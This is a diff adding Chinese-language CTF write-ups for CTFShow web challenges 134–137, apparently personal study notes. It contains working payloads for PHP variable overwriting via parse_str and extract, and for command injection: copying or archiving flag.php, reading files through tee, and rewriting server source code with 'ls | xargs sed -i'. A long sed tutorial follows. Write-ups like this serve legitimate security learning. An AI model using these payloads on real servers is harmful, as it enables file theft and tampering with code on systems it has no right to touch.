@@ -108,23 +108,189 @@ ctfshow{1f1e2060-0e05-44ac-9491-b89f4dc3b1a9}
 
 ## 134
 ![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783591860132_image.png)
+这题将GET和POST传入key1key2给禁用了
+payload:`?_POST[key1]=36d&_POST[key2]=36d`
+一开始 PHP 看到的是：
+```
+$_GET = [
+    "_POST" => [
+        "key1" => "36d",
+        "key2" => "36d"
+    ]
+];
+
+$_POST = [];
+```
+所以：
+```
+isset($_GET['key1'])   // false
+isset($_GET['key2'])   // false
+isset($_POST['key1'])  // false
+isset($_POST['key2'])  // false
+```
+检查绕过去了。
+然后关键来了：
+
+`@parse_str($_SERVER['QUERY_STRING']);`
+`$_SERVER['QUERY_STRING'] `就是 URL 问号后面的原始字符串:`_POST[key1]=36d&_POST[key2]=36d`
+`parse_str` 会把这段`字符串`解析成`变量`。
+所以它相当于执行了：
+```
+$_POST = [
+    "key1" => "36d",
+    "key2" => "36d"
+];
+```
+前面的 @ 只是抑制报错/警告，不影响逻辑。
+接着：
+`extract($_POST);`
+`extract` 的作用是:把`数组`的`键名`变成`变量名`。
+比如：
+```
+$_POST = [
+    "key1" => "36d",
+    "key2" => "36d"
+];
+```
+执行：
+`extract($_POST);`
+等价于：
+`$key1 = "36d";  $key2 = "36d";`
+
+而且 `extract` 默认会覆盖已有变量，所以原来的：
+`$key1 = 0;
+$key2 = 0;`
+被覆盖成了：
+`$key1 = "36d";
+$key2 = "36d";`
+最后判断成功：
+```
+if($key1 == '36d' && $key2 == '36d') {
+    die(file_get_contents('flag.php'));
+}
+```
+
+这题利用的是 `parse_str` 造成的变量覆盖，再配合 `extract($_POST)` 把 `$_POST['key1']、$_POST['key2']` 变成 $key1、$key2。典型的 PHP 变量污染。
+
+## 135
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783653159730_image.png)
+发现一个骚操作可以不用ping把数据带出来。如下：
+1.自身的值在被eval时候直接引用自身，可以用cp把flag复制到1.txt访问 ``?F=`$F`+;cp+flag.php+1.txt``
+
+2.可以使用tar打包flag.php文件，然后访问下载 payload： ``?F=`$F`+;tar -czvf 1.tar.gz flag.php`` 访问/1.tar.gz下载，解压即可
+
+## 136
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783655341285_image.png)
+
+一个正则过滤，一个无回显的命令执行
+使用`tee`命令，可以变为另一个文件，类似`>`
+
+`?c=ls /|tee 1` 访问1下载查看， `?c=cat /f149_15_h3r3|tee 2 `访问下载查看文件2
+
+还有一个更骚的操作
+``ls | xargs sed -i 's/die/echo/'``和``ls | xargs sed -i 's/exec/system/'``
+```
+ls：列出当前目录文件
+|：把前一个命令的结果传给后一个命令
+xargs：把文件名拼到后面的命令里
+sed -i 's/die/echo/'：直接在文件里把 die 替换成 echo
+```
+如果存在命令执行，且 sed -i 可用、源码可写、过滤没拦关键字符，那就很可能能“改题目源码”
+
+`sed` 可以理解成一个“命令行文本编辑器”。它最常见的用途就是：**查找、替换、删除、打印文本**。
+
+基本格式：
+
+```bash
+sed [选项] '操作命令' 文件名
+```
+
+最经典的是替换：
+
+```bash
+sed 's/旧内容/新内容/' file.txt
+```
+
+这里的 `s` 是 substitute，替换的意思。
+
+比如：
+
+```bash
+sed 's/apple/banana/' a.txt
+```
+
+意思是：把每一行里第一次出现的 `apple` 替换成 `banana`，然后把结果输出到屏幕。
+
+注意：默认不会修改原文件。
+
+如果想直接改文件，要加 `-i`：
+
+```bash
+sed -i 's/apple/banana/' a.txt
+```
+
+这就是能“改题目”的关键：
+
+```bash
+sed -i 's/die/echo/' index.php
+```
+
+意思是：直接在 `index.php` 里，把第一次匹配到的 `die` 替换成 `echo`。
+
+如果想一行里所有匹配都替换，加 `g`：
+
+```bash
+sed -i 's/apple/banana/g' a.txt
+```
+
+`g` 是 global，表示全局替换。
+
+还可以换分隔符。比如路径里很多 `/`，这样写很烦：
+
+```bash
+sed -i 's/\/var\/www\/html/\/tmp/g' a.txt
+```
+
+可以改成：
+
+```bash
+sed -i 's#/var/www/html#/tmp#g' a.txt
+```
+
+`sed` 不强制用 `/` 当分隔符，`#`、`@` 都可以。
+
+----
+
+几个常见用法：
+
+`sed -n '1,5p' a.txt`只打印第 1 到第 5 行。这里 `-n` 表示不要默认输出，`p` 表示 print。
+
+`sed '3d' a.txt`删除第 3 行后输出结果。
+
+`sed '/password/d' a.txt`删除包含 `password` 的行。
+
+`sed -i.bak 's/old/new/g' a.txt`原地修改，同时生成备份文件 `a.txt.bak`。
+
+----
+
+`ls | xargs sed -i 's/exec/system/'`拆开就是：
+
+`ls`列出当前目录文件。
+
+`xargs`把前面的文件名拼到后面的命令后面。
+
+最终变成：
+
+`sed -i 's/exec/system/' index.php`
+
+也就是直接修改 PHP 源码。
+
+所以在 CTF 命令执行题里，`sed` 很危险的原因是：它不是单纯查看文件，而是能用 `-i` **原地改服务器上的文件内容**。只要 Web 进程有写权限，过滤又没拦住它，就可能修改题目逻辑。
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+## 137
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783660917916_image.png)
 
 
